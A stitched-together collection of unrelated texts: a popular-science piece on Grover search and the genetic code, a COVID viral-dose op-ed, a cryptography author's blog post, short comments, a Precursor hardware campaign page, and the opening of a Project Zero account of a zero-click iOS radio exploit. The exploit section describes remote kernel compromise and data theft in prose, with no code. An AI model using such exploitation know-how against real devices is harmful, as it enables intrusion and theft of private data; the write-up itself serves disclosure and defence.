by [Emerging Technology from the arXiv](

Back in 1996, a quantum physicist at Bell Labs in New Jersey published a new recipe for searching through a database of N entries. Computer scientists have long known that this process takes around N steps because in the worst case, the last item on the list could be the one of interest.
However, this physicist, Lov Grover, showed how the strange rules of quantum mechanics allowed the search to be done in a number of steps equal to the square root of N.
That was a big deal. Searching databases is a foundational task in computer science, used for everything from finding telephone numbers to breaking cryptographic codes. So any speed-up is a significant advance.
Quantum mechanics provided an additional twist. At the time, Grover’s recipe was only the second quantum algorithm that had been proved faster than its classical counterpart. (The first was Peter Shor’s algorithm for factoring numbers, which he discovered in 1994.) Grover’s work was an important factor in preparing the way for the quantum computing revolution that is still ongoing today.
But despite the interest, implementing Grover’s algorithm has taken time because of the significant technical challenges involved. The first quantum computer capable of implementing it appeared in 1998, but the first scalable version didn’t appear until 2017, and even then it worked with only three qubits. So new ways to implement the algorithm are desperately needed.
Today Stéphane Guillet and colleagues at the University of Toulon in France say this may be easier than anybody expected. They say they have evidence that Grover’s search algorithm is a naturally occurring phenomenon. “We provide the first evidence that under certain conditions, electrons may naturally behave like a Grover search, looking for defects in a material,” they say.
That has obvious implications for quantum computing, but its real import may be much more profound. For some time, theorists have debated whether quantum search could explain one of the greatest mysteries about the origin of life. The idea that Grover searches occur in nature could finally solve the conundrum.
First some background. Because it is so fundamental, Grover’s search algorithm can be reformulated in a variety of ways. One of these is as a quantum walk across a surface—the way a quantum particle would move randomly from one point to another.
Clearly, this process is a kind of search of two-dimensional space. But because a quantum particle can explore many paths at the same time, it is much faster than a classical search.
The nature of the surface has an important influence on the search. For example, one type of surface consists of a square grid where the quantum particle has four possible moves at each vertex.
But there are many other possible grids; a triangular one, for example, where the quantum particle has three choices at each vertex. “The triangular grid is of particular interest because of its resemblance to several naturally occurring crystal-like materials,” say Guillet and co.
The team focused on simulating the way a Grover search works for electrons exploring triangular and square grids, but they also included other physically realistic effects, such as defects in the grid in the form of holes, and quantum properties such as interference effects.
[Quantum walk]
The results are eye-opening. The question they ask is how quickly an electron can find the hole in a grid. And the team’s big breakthrough is to show that these simulations reproduce the way real electrons behave in real materials.
In other words, this is evidence that free electrons naturally implement the Grover search algorithm when moving across the surface of certain crystals.
That has immediate implications for quantum computing. “[This work] may be the path to a serious technological leap, whereby experimentalist would bypass the need for a full-fledged scalable and error-correcting Quantum Computer, and take the shortcut of looking for ‘natural occurrences’ of the Grover search instead,” say the team.
The work also has implications for our thinking about the genetic code and the origin of life. Every living creature on Earth uses the same code, in which DNA stores information using four nucleotide bases. The sequences of nucleotides encode information for constructing proteins from an alphabet of 20 amino acids.
But why these numbers—four and 20—and not some others? Back in 2000, just a few years after Grover published his work, [Apoorva Patel at the Indian Institute of Science in Bangalore showed how Grover’s algorithm could explain these numbers](
Patel’s idea is related to the way DNA is assembled inside cells. In this situation, the molecular machinery inside a cell must search through the molecular soup of nucleotide bases to find the right one. If there are four choices, a classical search takes four steps on average. So the machinery would have to try four different bases during each assembly step.
But a quantum search using Grover’s algorithm is much quicker: Patel showed that when there are four choices, a quantum search can distinguish between four alternatives in a single step. Indeed, four is optimal number.
This thinking also explains why there are 20 amino acids. In DNA, each set of three nucleotides defines a single amino acid. So the sequence of triplets in DNA defines the sequence of amino acids in a protein.
But during protein assembly, each amino acid must be chosen from a soup of 20 different options. Grover’s algorithm explains these numbers: a three-step quantum search can find an object in a database containing up to 20 kinds of entry. Again, 20 is the optimal number.
In other words, if the search processes involved in assembling DNA and proteins is to be as efficient as possible, the number of bases should be four and the number of amino acids should to be 20—exactly as is found. The only caveat is that the searches must be quantum in nature.
When Patel published his idea, quantum physicists immediately pooh-poohed it. At the time, they were bogged down in their own attempts to control quantum processes, which they could do only by isolating quantum particles in extreme environments such as at temperatures close to absolute zero.
The obvious problem, they said, was that living things operate in a warm, messy environment in which quantum states would be immediately destroyed.
Biologists were equally dismissive, saying that quantum processes couldn’t possibly be at work inside living things.
Since then, an increasing body of evidence has emerged that quantum processes play an important role in a number of biological mechanisms. Photosynthesis, for example, is now thought to be an essentially quantum process.
The work of Guillet and co throws a new perspective on all this. It suggests that Grover’s algorithm is not only possible in certain materials; it seems to be a property of nature. And if that’s true, then the objections to Patel’s ideas start to crumble.
It may be that life is just an example of Grover’s quantum search at work, and that this algorithm is itself a fundamental property of nature. That’s a Big Idea if ever there was one.

These Coronavirus Exposures Might Be the Most Dangerous
As with any other poison, viruses are usually deadlier in larger amounts.

Dr. Rabinowitz is a professor of chemistry and genomics. Dr. Bartman is a genomic researcher.
Li Wenliang, the doctor in China who raised early awareness of the new coronavirus, died of the virus in February at 34. His death was shocking not only because of his role in publicizing the developing epidemic but also — given that young people do not have a high risk of dying from Covid-19 — because of his age.
Is it possible that Dr. Li died because as a doctor who spent a lot of time around severely ill Covid-19 patients, he was infected with such a high dose? After all, though he was one of the first young health care workers to die after being exposed up close and frequently to the virus, he was unfortunately not the last.
The importance of viral dose is being overlooked in discussions of the coronavirus. As with any other poison, viruses are usually more dangerous in larger amounts. Small initial exposures tend to lead to mild or asymptomatic infections, while larger doses can be lethal.
From a policy perspective, we need to consider that not all exposures to the coronavirus may be the same. Stepping into an office building that once had someone with the coronavirus in it is not as dangerous as sitting next to that infected person for an hourlong train commute.
This may seem obvious, but many people are not making this distinction. We need to focus more on preventing high-dose infection.
Both small and large amounts of virus can replicate within our cells and cause severe disease in vulnerable individuals such as the immunocompromised. In healthy people, however, immune systems respond as soon as they sense a virus growing inside. Recovery depends on which wins the race: viral spread or immune activation.
Virus experts know that viral dose affects illness severity. In the lab, mice receiving a low dose of virus clear it and recover, while the same virus at a higher dose kills them. Dose sensitivity has been observed for every common acute viral infection that has been studied in lab animals, including coronaviruses.
Humans also exhibit sensitivity to viral dose. Volunteers have allowed themselves to be exposed to low or high doses of relatively benign viruses causing colds or diarrhea. Those receiving the low doses have rarely developed visible signs of infection, while high doses have typically led to infections and more severe symptoms.
It would be unethical to experimentally manipulate viral dose in humans for a pathogen as serious as the coronavirus, but there is evidence that dose also matters for the human coronavirus. During the 2003 SARS coronavirus outbreak in Hong Kong, for instance, one patient infected many others living in the same complex of apartment buildings, resulting in 19 dead. The spread of infection is thought to have been caused by airborne viral particles that were blown throughout the complex from the initial patient’s apartment unit. As a result of greater viral exposure, neighbors who lived in the same building were not only more frequently infected but also more likely to die. By contrast, more distant neighbors, even when infected, suffered less.
Low-dose infections can even engender immunity, protecting against high-dose exposures in the future. Before the invention of vaccines, doctors often intentionally infected healthy individuals with fluid from smallpox pustules. The resulting low-dose infections were unpleasant but generally survivable, and they prevented worse incidents of disease when those individuals were later exposed to smallpox in uncontrolled amounts.
Despite the evidence for the importance of viral dose, many of the epidemiological models being used to inform policy during this pandemic ignore it. This is a mistake.
People should take particular care against high-dose exposures, which are most likely to occur in close in-person interactions — such as coffee meetings, crowded bars and quiet time in a room with Grandma — and from touching our faces after getting substantial amounts of virus on our hands. In-person interactions are more dangerous in enclosed spaces and at short distances, with dose escalating with exposure time. For transient interactions that violate the rule of maintaining six feet between you and others, such as paying a cashier at the grocery store, keep them brief — aim for “within six feet, only six seconds.”
Because dose matters, medical personnel face an extreme risk, since they deal with the sickest, highest-viral-load patients. We must prioritize protective gear for them.
For everyone else, the importance of social distancing, mask-wearing and good hygiene is only greater, since these practices not only decrease infectious spread but also tend to decrease dose and thus the lethalness of infections that do occur. While preventing viral spread is a societal good, avoiding high-dose infections is a personal imperative, even for young healthy people.
At the same time, we need to avoid a panicked overreaction to low-dose exposures. Clothing and food packaging that have been exposed to someone with the virus seem to present a low risk. Healthy people who are together in the grocery store or workplace experience a tolerable risk — so long as they take precautions like wearing surgical masks and spacing themselves out.
A complete lockdown of society is the most effective way to stop spread of the virus, but it is costly both economically and psychologically. When society eventually reopens, risk-reduction measures like maintaining personal space and practicing proper hand-washing will be essential to reducing high-dose infections. High-risk sites for high-dose exposure, like stadiums and convention venues, should remain shuttered. Risky but essential services like public transportation should be allowed to operate — but people must follow safety measures such as wearing masks, maintaining physical spacing and never commuting with a fever.
Now is the time to stay home. But hopefully this time will be brief. When we do begin to leave our homes again, let’s do it wisely, in light of the importance of viral dose.

@_subject: Droplet vs. aerosol transmission of COVID-19 
it appears COVID-19 might not be spread via aerosol transmission, instead via larger droplets:
From our examination of the potential routes of transmission, we concluded that the most likely cause of this outbreak was droplet transmission...
Virus transmission in this outbreak cannot be explained by droplet transmission alone. Larger respiratory droplets (>5 μm) remain in the air for only a short time and travel only short distances, generally <1 m ([2]( The distances between patient A1 and persons at other tables, especially those at table C, were all >1 m. However, strong airflow from the air conditioner could have propagated droplets from table C to table A, then to table B, and then back to table C ([Figure](

Why I’m Writing A Book On Cryptography  posted last month
I’ve now been writing a book on applied cryptography for a year and a half. I’m nearing the end of my journey, as I have one last ambitious chapter left to write: next-generation cryptography (a chapter that I’ll use to talk about cryptography that will become more and more practical: post-quantum cryptography, homomorphic encryption, multi-party computation, and zk-SNARKs).
I’ve been asked multiple times why write a new book about cryptography? and why should I read your book?. To answer this, you have to understand when it all started…
Diagrams are everything
Today if you want to learn about almost anything, you just google it. Yet, for cryptography, and depending on what you're looking for, resources can be quite lacking.
It all started a long time ago. For a class, I had to implement a [differential power analysis attack]( a breakthrough in cryptanalysis as it was the first side-channel attack to be published. A differential power analysis uses the power consumption of a device during an encryption to leak its private key. At the time, I realized that great papers could convey great ideas with very little emphasis on understanding. I remember banging my head against the wall trying to figure out what the author of the white paper was trying to say. Worse, I couldn’t find a good resource that explained the paper. So I banged my head a bit more, and finally I got it. And then I thought I would help others. So I drew some diagrams, animated them, and recorded myself going over them. That was [my first screencast](
This first step in education was enough to make me want to do more. I started making more of these videos, and started writing more articles about cryptography on this blog (today totaling more than 500 articles).
[we want to know]
I realized early that diagrams were extremely helpful to understand complicated concepts, and that strangely most resources in the field shied away from them.
For example, anyone in cryptography who thinks about AES-CBC would immediately think about the following wikipedia diagram:
[aes cbc]
So here I was, trying to explain everything I learned, and thinking hard about what sorts of simple diagrams could easily convey these complex ideas. That’s when I started thinking about a book, years and years before [Manning Publications]( would reach out to me with a book deal.
The applied cryptographer curriculum
 I hadn’t started cryptography due to a long-life passion. I had finished a bachelor in theoretical mathematics and didn’t know what was next for me. I had also been programming my whole life, and I wanted to reconcile the two. Naturally, I got curious about cryptography, which seemed to have the best of both world, and started reading the different books at my disposal. I quickly discovered my life's calling.
Some things were annoying me though. In particular, the long introductions that would start with history. I was only interested in the technicalities, and always had been. I swore to myself, if I ever wrote a book about cryptography, I would not write a single line on Vigenère ciphers, Caesar ciphers, and others.
And so after applying to the masters of Cryptography at the university of Bordeaux, and obtaining a degree in the subject, I thought I was ready for the world. Little did I know. What I thought was a very applied degree actually lacked a lot on the real world protocols I was about to attack. I had spent a lot of time learning about the mathematics of elliptic curves, but nothing about how they were used in cryptographic algorithms. I had learned about LFSRs, and ElGamal, and DES, and a series of other cryptographic primitives that I would never see again.
When I started working in the industry at Matasano, which then became NCC Group, my first gig was to audit [OpenSSL]( (the most popular TLS implementation). Oh boy, did it hurt my brain. I remember coming back home every day with a strong headache. What a clusterfuck of a library. I had no idea at the time that I would years later become a co-author of TLS 1.3.
But at that point I was already thinking: this is what I should have learned in school. The knowledge I’m getting now is what would have been useful to prepare me for the real world. After all, I was now a security practitioner specialized in cryptography. I was reviewing real-world cryptographic applications. I was doing the job that one would wish they had after finishing a cryptography degree. I implemented, verified, used, and advised on what cryptographic algorithms to use.
This is the reason I’m the first reader of the book I’m writing. This is what I would have written to my past self in order to prepare me for the real world.
The use of cryptography is where most of the bugs are
My consulting job led me to audit many real world cryptographic applications like the [OpenSSL]( the [encrypted backup system of Google]( the [TLS 1.3 implementation of Cloudflare]( the [certificate authority protocol of Let’s Encrypt]( the [sapling protocol of Zcash]( the [threshold proxy re-encryption scheme of NuCypher]( and dozens and dozens of other real-world cryptographic applications that I unfortunately cannot mention publicly.
Early in my job, I was tasked to audit the custom protocol a big corporation (that I can’t name) had written to encrypt their communications. It turns out that, they were signing everything but the ephemeral keys, which completely broke the whole protocol (as one could have easily replaced the ephemeral keys). A rookie mistake from anyone with some experience with secure transport protocols, but something that was missed by people who thought they were experienced enough to roll their own crypto. I remember explaining the vulnerability at the end of the engagement, and a room full of engineers turning silent for a good 30 seconds.
This story repeated itself many times during my career. There was this time where while auditing a cryptocurrency for another client, I found a way to forge transactions from already existing ones (due to some ambiguity of what was being signed). Looking at TLS implementations for another client, I found some subtle ways to break an RSA implementation, which in turned transformed into a white paper (with one of the inventor of RSA) leading to a number of [Common Vulnerabilities and Exposures (CVEs) reported to a dozen of open source projects]( More recently, reading about Matrix as part of writing my book, I realized that their authentication protocol was completely broken, [leading to a complete break of their end-to-end encryption](
There’s so many details that can unfortunately collapse under you, when making use of cryptography. At that point, I knew I had to write something about it. This is why my book contains many of these anecdotes.
As part of the job, I would review cryptography libraries and applications in a multitude of programming languages. I discovered bugs (for example [CVE-2016-3959]( in Golang’s standard library), I researched ways that libraries could fool you into misusing them (for example see my paper [How to Backdoor Diffie-Hellman]( and I advised on what libraries to use. Developers never knew what library to use, and I always found the answer to be tricky.
I went on to invent the [disco protocol]( and wrote a fully-featured cryptographic library in less than 1,000 lines of code in several languages. Disco only relied on two cryptographic primitives: the permutation of SHA-3 and curve25519. Yes, from only these two things in 1,000 lines of code a developer could do any type of authenticated key exchange, signatures, encryption, MACs, hashing, key derivation, etc. This gave me a unique perspective as to what a good cryptographic library was supposed to be.
I wanted my book to contain these kind of practical insights. So naturally, the different chapters contain examples on how to do crypto in different programming languages, using well-respected cryptographic libraries.
A need for a new book?
As I was giving [one of my annual cryptography training at Black Hat]( one student came to me and asked if I could recommend a good book or online course on cryptography. I remember advising the student to read [the book from Boneh & Shoup]( and [Cryptography I from Boneh on Coursera](
The student told me “Ah, I tried, it’s too theoretical!”. This answer stayed with me. I disagreed at first, but slowly realized that they were right. Most of these resources were pretty heavy in math, and most developers interacting with cryptography don’t want to deal with math.  What else was there for them? The other two somewhat respected resources at the time were Applied Cryptography and Cryptography Engineering (both from Schneier). But these books were starting to be quite outdated. Applied Cryptography spent 4 chapters on block ciphers, with a whole chapter on cipher modes of operation but none on authenticated encryption. Cryptography Engineering had a single mention of elliptic curve cryptography (in a footnote).
On the other hand, many of my videos or blog posts were becoming good primary references for some cryptographic concepts.
I knew I could do something special.
Gradually, many of my students started becoming interested in cryptocurrencies, asking more and more questions on the subject. At the same time, I started to audit more and more cryptocurrency applications. I finally moved to a job at Facebook to work on [Libra]( Cryptocurrency was now one of the hottest field to work on, mixing a multitude of extremely interesting cryptographic primitives that so far had seen no real-world use case (zero knowledge proofs, aggregated signatures, threshold cryptography, multi-party computations, consensus protocols, cryptographic accumulators, verifiable random functions, verifiable delay functions, ... the list goes on)
I was now in a unique position.
I knew I could write something that would tell students, developers, consultants, security engineers, and others, what modern applied cryptography was all about.
This was going to be a book with very little formulas, but filled with many diagrams.
This was going to be a book with little history, but filled with modern stories about cryptographic failures that I had witnessed for real.
This was going to be a book with little about legacy algorithms, but filled with cryptography that I've personally seen being used at scale: TLS, the Noise protocol framework, Wireguard, the Signal protocol, cryptocurrencies, HSMs, threshold cryptography, and so on.
This was going to be a book with little theoretical cryptography, but filled with what could become relevant: password-authentication key exchanges, zero-knowledge proofs, post-quantum cryptography, and so on.
Real-World Cryptography
When [Manning Publications]( reached out to me in 2018, asking if I wanted to write a book on cryptography for them, I already knew the answer. I already knew what I wanted to write about. I had just been waiting for someone to give me the opportunity, the excuse to spend my time writting the book I had in mind.
Coincidentally, they had a series of "real-world" book, and so naturally I suggested that my book extend it.
Real-World Cryptography is [available for free in early-access](
I want this to be the best book on applied cryptography. For this reason, if you have any feedback to give, please send it my way :)
The book should be ready in print for the end of the year.

interesting that encrypted client hello is not blocked, as this would also make the SNI private! perhaps this is targeting by adoption, rather than capability.
if hosts move to encrypted client hello, will this next be blocked?
also, per  :
Moreover, as more clients enable ECH support, e.g., as normal part of Web browser functionality, with keys supplied by shared hosting providers, the presence of ECH extensions becomes less unusual and part of typical client behavior.  In other words, if all Web browsers start using ECH, the presence of this value will not signal unusual behavior to passive eavesdroppers.

there is a different program in California to deter property crime: every business and home keeps a local store of recent video - there is no feed to the police.
if a crime occurs, the residents themselves collect relevant video subsets for police to use, but never do the cops get a raw video feed.
this system is also robust against network failure - an additional benefit!
decentralized solutions such as these are often more robust, and more privacy responsible. they just lack the profit potential of centralized systems that exploit users for additional profit... fight for decentralized technology in your municipality!

the root of the issue is complexity - general intelligence is complicated!
deep learning, the usual tool, requires a huge font of data. typically the domain of governments, corporations, and universities.
on top of this, training models on such large data sets is expensive in terms of computing cost. again, typically only in the budget for governments, corporations, and universities.
i am reminded of semiconductor electronics. it used to be you could assemble yourself, but now giant fabs rule the game. same for AI: used to be you could innovate on your own, but now it takes research teams at large organizations with deep pockets.
not to say you shouldn't try! but it might be a decade or more before your personal tools reach the capability of today's cutting edge models.

@_subject: Precursor - Mobile, Open Hardware, 
Made For a Lab. Fits in a Pocket. Verifiable by Design.
Precursor is an open hardware development platform for secure, mobile computation and communication. This pocket-sized device accommodates a built-in display, a physical keyboard, and an internal battery while remaining smaller and lighter than the average smartphone. Precursor was built for use on the road, but it compromises nothing as a development platform. Powered by an FPGA-hosted, soft-core System-on-Chip (SoC), it gives developers the freedom to inspect, verify, and customize nearly every aspect of its operation. Help us take those critical first steps toward a world in which silicon-level trustworthiness is attainable.
[Precursor teardown parts view]
Trust It. Because You Can, Not Because You Have to.
We are accustomed to accepting the word of large corporations, like Apple and Google, that our gadgets are trustworthy. Without any hard evidence, we’ve long had to take in on faith that our privacy is being respected and that our personal data is not just one backdoor away from being stolen, exploited, or exposed. (We’ll go ahead and leave "monetized" off that list, since we all know that’s happening.) We’ve had to accept this reality in large part because we’ve had no other choice. Precursor changes the status quo by making evidence-based trust a core principle of its design. We have subjected every aspect of this platform to a level of scrutiny that will allow users to trust their devices. You, the user, will be able to trust Precursor based on scientific evidence that is observable without access to a million-dollar microscope.
The principle of evidence-based trust was at work in our decision to implement Precursor’s brain as an SoC on an FPGA, which means you can compile your CPU from design source and verify for yourself that Precursor contains [no hidden instructions]( or [other backdoors]( Accomplishing the equivalent level of inspection on a piece of hardwired silicon would be…a rather expensive proposition. Precursor’s mainboard was [designed for easy inspection]( as well, and even its LCD and keyboard were chosen specifically because they facilitate verification of proper construction with minimal equipment.
Thanks to this pivotal design principle, Precursor is well-suited as a hardware development framework for security-critical applications such as password managers, authenticators, crypto wallets, and secure messaging platforms.
[Precursor keyboard PCB translucency]
Carry It. With You When You Need It
Precursor is also distinctive among open hardware gadgets in that it was designed from the ground up for portability. While most open hardware FPGA development boards share Precursor’s evidence-based, compile-your-own-CPU trust properties, none of them are packaged into a slim, 7.2 mm, machined-aluminum case, complete with a charger, a battery, a display, and a keyboard. And speaking of batteries, Precursor draws less power than most other FPGAs thanks to the "-1L" variant Xilinx Spartan 7-Series at its heart. (The "L" stands for "low leakage.") That efficiency — combined with a super-low-power Lattice iCE40 UP5K FPGA for deep-sleep system management and a Silicon Labs WF200 with integrated network co-processor for Wi-Fi connectivity — allows Precursor to achieve a standby time measured in days and an active screen time of about five to six hours.
Precursor gets your bright idea out of the lab and into your pocket. And if that idea happens to involve software for a password manager, a crypto-wallet, a secure messaging platform, or something similar, then Precursor also gets it well on its way toward its destination as a packaged product.
[Precursor mobile device on the bar]
Jailbreak It? Precursor Was Born Free!
The most important difference between a jail and a home is who controls the lock on the door. Most smartphone companies want you to believe that the gilded jail they’ve designed for you is the safest place to spend your time. Precursor takes a different approach. By giving you the keys to the lock, it gives you a home. And, like your actual home, you’re free to make it your own because we’ve published 100% of Precursor’s design source, from the outer case to the inner CPU core. And once you’re done configuring and inspecting your system, you can activate Precursor’s security features to protect your newly redecorated home from unwelcome intruders.
What’s in the Box?
The Precursor tier includes the following items in the box:
- One fully assembled and tested Precursor device in an aluminium case, complete with display, bezel, QWERTY keyboard, and battery, and pre-loaded with low-level factory test firmware.
- One "debug board," which is a Raspberry Pi 3B+ or 4 HAT. This used for low-level debugging and reflashing of the Precursor in case you brick it. Raspberry Pi not included.
- Three alternate keyboard overlays: QWERTZ, AZERTY, and Dvorak.
- Press-fit metal shield for trusted domain of the Precursor PCB (to be installed after verification).
- Four grams of EPO-TEK 301 in a bi-pak, for sealing the metal shield Note: the seal is permanent and we can't do any warranty returns/exchanges on sealed devices. Do not apply glue to active connectors.
The Limited Edition Precursor tier includes all of the above, with a special limited edition case. You will also receive the regular production aluminium case body as well, as a bonus spare part.
What exactly is the Limited Edition case? In a fashion similar to ordering [omakase]( at a sushi bar, we’re going to prepare a premium experience for your enjoyment. In the end, however, what you get will be a bit of a surprise!

"Betrusted-SoC" Reference Design
Part of the purpose of Precursor is to validate the system-on-chip (SoC) design we hope eventually to produce as a custom ASIC for use in future such products. This SoC, which we call "Betrusted-SoC," is meant to be the central pillar of security for devices like Precursor. The version of Betrusted-SoC used in Precursor is based on a Xilinx FPGA and has the following features:

Manufacturing Plan
Precursor consists of the following major elements:
- The Mainboard will be manufactured by AQS, an EMS provider, at their South Korea facility. The bare PCB will be produced by King Credie in Guangdong, China. All of the parts on the BOM were selected explicitly for ready availability in distribution channels such as Mouser and Digi-Key. We do anticipate a 12-week lead time on the Xilinx FPGAs, and acquiring them in a timely fashion represents a risk given the current pandemic and the status of the global supply chain.
- The rear case and radome will be manufactured by Jiada, a contract mechanical engineering supplier located in Guangdong, China. Production rear cases will be manufactured on-demand using a CNC milling process and finished with anodization. The radome will be produced using an injection molding tool that will be opened upon successful conclusion of the funding campaign.
- The battery is sourced from a supplier in Guangdong, China. Because of its short shelf life and high MOQ, this does represent a high risk item. We will finalize the battery supplier and UN38.3 certifications that allow for air shipping after the conclusion of the campaign.
- The front bezel is a step-milled, edge-beveled PCB made using a special FR-4 composition impregnated with black dye by King Credie in Guangdong, China. The front bezel also incorporates the Wi-Fi antenna.
- The LCD is sourced from Sharp Microelectronics. Due to its highly critical nature and long lead time, we have gone ahead with a risk buy to ensure its availability for the campaign. If the campaign greatly exceeds volume expectations, we may have to take a staged approach to delivery as LCD shipments become available.
- The backlight assembly was pre-manufactured to match the LCD.
- The keyboard overlay is a full-custom, UV-cured, polycarbonate assembly with silkscreen printing, all done via AQS in Dongguan, China.
- The keyboard PCB is a semi-custom "transparent" substrate, manufactured by King Credie in Dongguan, China.
- The button array is sourced from AQS in Dongguan, China.
- Final assembly will be done at AQS in South Korea.
Once the campaign has concluded and we know our final volume, we will begin manufacturing according to the following time line:
- January 2021 – Place orders
- February 2021 – It will be Chinese New Year, and factories will be shut down. We will use this time to develop the factory test for Precursor
- March 2021* – FCC and CE testing of final production prototypes. The question of if and when we can carry out such testing will be heavily impacted by pandemic travel restrictions which represent a significant risk to the project.
- March-June 2021 – Roughly 16 weeks lead time for all components to arrive at the South Korea facility.
- July-August 2021 – Pilot production of initial units in the South Korea facility. Timing and pace of production will depend heavily on our ability to travel to the facility to oversee production bring-up. If travel is not possible due to pandemic restrictions, we may suffer a 1-2 month delay as we mail samples back and forth from the factory to our engineering HQ in Singapore.
- September-October 2021 – Shipment of units to the USA.
- November-December 2021 – First shipments of units to backers. We anticipate that Limited Edition units will take up to 2-3 additional months to arrive, depending upon the nature of the manufacturing processes required to produce them.

An iOS zero-click radio proximity exploit odyssey
Posted by Ian Beer, Project Zero
NOTE: This specific issue was fixed before the launch of [Privacy-Preserving Contact Tracing]( in iOS 13.5 in May 2020.
In this demo I remotely trigger an unauthenticated kernel memory corruption vulnerability which causes all iOS devices in radio-proximity to reboot, with no user interaction. Over the next 30'000 words I'll cover the entire process to go from this basic demo to successfully exploiting this vulnerability in order to run arbitrary code on any nearby iOS device and steal all the user data
Quoting [ Offensivecon keynote]( from February 2020:
"Exploits are the closest thing to "magic spells" we experience in the real world: Construct the right incantation, gain remote control over device."
For 6 months of 2020, while locked down in the corner of my bedroom surrounded by my lovely, screaming children, I've been working on a magic spell of my own. No, sadly not an incantation to convince the kids to sleep in until 9am every morning, but instead a wormable radio-proximity exploit which allows me to gain complete control over any iPhone in my vicinity. View all the photos, read all the email, copy all the private messages and monitor everything which happens on there in real-time.
The takeaway from this project should not be: no one will spend six months of their life just to hack my phone, I'm fine.
Instead, it should be: one person, working alone in their bedroom, was able to build a capability which would allow them to seriously compromise iPhone users they'd come into close contact with.
Imagine the sense of power an attacker with such a capability must feel. As we all pour more and more of our souls into these devices, an attacker can gain a treasure trove of information on an unsuspecting target.
What's more, with [directional antennas]( higher transmission powers and sensitive receivers the range of such attacks can be considerable.
I have no evidence that these issues were exploited in the wild; I found them myself through manual reverse engineering. But we do know that exploit vendors seemed to take notice of these fixes. For example, take this tweet from Mark Dowd, the co-founder of [Azimuth Security]( an Australian "market-leading information security business":
This tweet from  on May 27th 2020 mentioned a double free in BSS reachable via AWDL
The vulnerability Mark is referencing here is one of the vulnerabilities I reported to Apple. You don't notice a fix like that without having a deep interest in this particular code.
[This Vice article from 2018]( gives a good overview of Azimuth and why they might be interested in such vulnerabilities. You might trust that Azimuth's judgement of their customers aligns with your personal and political beliefs, you might not, that's not the point. Unpatched vulnerabilities aren't like physical territory, occupied by only one side. Everyone can exploit an unpatched vulnerability and Mark Dowd wasn't the only person to start tweeting about vulnerabilities in AWDL.
This has been the longest solo exploitation project I've ever worked on, taking around half a year. But it's important to emphasize up front that the teams and companies supplying the global trade in cyberweapons like this one aren't typically just individuals working alone. They're well-resourced and focused teams of collaborating experts, each with their own specialization. They aren't starting with absolutely no clue how bluetooth or wifi work. They also potentially have access to information and hardware I simply don't have, like [development devices]( [special cables]( leaked source code, symbols files and so on.
Of course, an iPhone isn't designed to allow people to build capabilities like this. So what went so wrong that it was possible? Unfortunately, it's the same old story. A fairly trivial buffer overflow programming error in C++ code in the kernel parsing untrusted data, exposed to remote attackers.
In fact, this entire exploit uses just a single memory corruption vulnerability to compromise the flagship iPhone 11 Pro device. With just this one issue I was able to defeat all the mitigations in order to remotely gain native code execution and kernel memory read and write.
Relative to the size and complexity of these codebases of major tech companies, the sizes of the security teams dedicated to proactively auditing their product's source code to look for vulnerabilities are very small. Android and iOS are complete custom tech stacks. It's not just kernels and device drivers but dozens of attacker-reachable apps, hundreds of services and thousands of libraries running on devices with customized hardware and firmware.
Actually reading all the code, including every new line in addition to the decades of legacy code, is unrealistic, at least with the division of resources commonly seen in tech where the ratio of security engineers to developers might be 1:20, 1:40 or even higher.
To tackle this insurmountable challenge, security teams rightly place a heavy emphasis on design level review of new features. This is sensible: getting stuff right at the design phase can help limit the impact of the mistakes and bugs which will inevitably occur. For example, ensuring that a new hardware peripheral like a GPU can only ever access a restricted portion of physical memory helps constrain [the worst-case outcome if the GPU is compromised by an attacker]( The attacker is hopefully forced to find an additional vulnerability to "lengthen the exploit chain", having to use an ever-increasing number of vulnerabilities to hack a single device. Retrofitting constraints like this to already-shipping features would be much harder, if not impossible.
In addition to design-level reviews, security teams tackle the complexity of their products by attempting to constrain what an attacker might be able to do with a vulnerability. These are mitigations. They take many forms and can be general, like [stack cookies]( or application specific, like [Structure ID in JavaScriptCore]( The guarantees which can be made by mitigations are generally weaker than those made by design-level features but the goal is similar: to "lengthen the exploit chain", hopefully forcing an attacker to find a new vulnerability and incur some cost.
The third approach widely used by defensive teams is fuzzing, which attempts to emulate an attacker's vulnerability finding process with brute force. Fuzzing is often misunderstood as an effective method to discover easy-to-find vulnerabilities or "low-hanging fruit". A more precise description would be that fuzzing is an effective method to discover easy-to-fuzz vulnerabilities. Plenty of vulnerabilities which a skilled vulnerability researcher would consider low-hanging fruit can require reaching a program point that no fuzzer today will be able to reach, no matter the compute resources used.
The problem for tech companies and certainly not unique to Apple, is that while design review, mitigations, and fuzzing are necessary for building secure codebases, they are far from sufficient.
Fuzzers cannot reason about code in the same way a skilled vulnerability researcher can. This means that without concerted manual effort, vulnerabilities with a relatively low cost-of-discovery remain fairly prevalent. A major focus of my work over the last few years had been attempting to highlight that the iOS codebase, just like any other major modern operating system, has a high vulnerability density. Not only that, but there's a high density of "good bugs", that is, vulnerabilities which enable the creation of powerful weird machines.
This notion of "good bugs" is something that offensive researchers understand intuitively but something which might be hard to grasp for those without an exploit development background. [Thomas Dullien's weird machines paper]( provides the best introduction to the notion of weird machines and their applicability to exploitation. Given a sufficiently complex state machine operating on attacker-controlled input, a "good bug" allows the attacker-controlled input to instead become "code", with the "good bug" introducing a new, unexpected state transition into a new, unintended state machine. The art of exploitation then becomes the art of determining how one can use vulnerabilities to introduce sufficiently powerful new state transitions such that, as an end goal, the attacker-supplied input becomes code for a new, weird machine capable of arbitrary system interactions.
It's with this weird machine that mitigations will be defeated; even a mitigation without implementation flaws is usually no match for a sufficiently powerful weird machine. An attacker looking for vulnerabilities is looking specifically for weird machine primitives. Their auditing process is focused on a particular attack-surface and particular vulnerability classes. This stands in stark contrast to a product security team with responsibility for every possible attack surface and every vulnerability class.
As things stand now in November 2020, I believe it's still quite possible for a motivated attacker with just one vulnerability to build a sufficiently powerful weird machine to completely, remotely compromise top-of-the-range iPhones. In fact, the parts of that process which are hardest probably aren't those which you might expect, at least not without an appreciation for weird machines.
Vulnerability discovery remains a fairly linear function of time invested. Defeating mitigations remains a matter of building a sufficiently powerful weird machine. Concretely, Pointer Authentication Codes (PAC) meant I could no longer take the popular direct shortcut to a very powerful weird machine via trivial program counter control and ROP or JOP. Instead I built a remote arbitrary memory read and write primitive which in practise is just as powerful and something which the current implementation of PAC, which focuses almost exclusively on restricting control-flow, wasn't designed to mitigate.
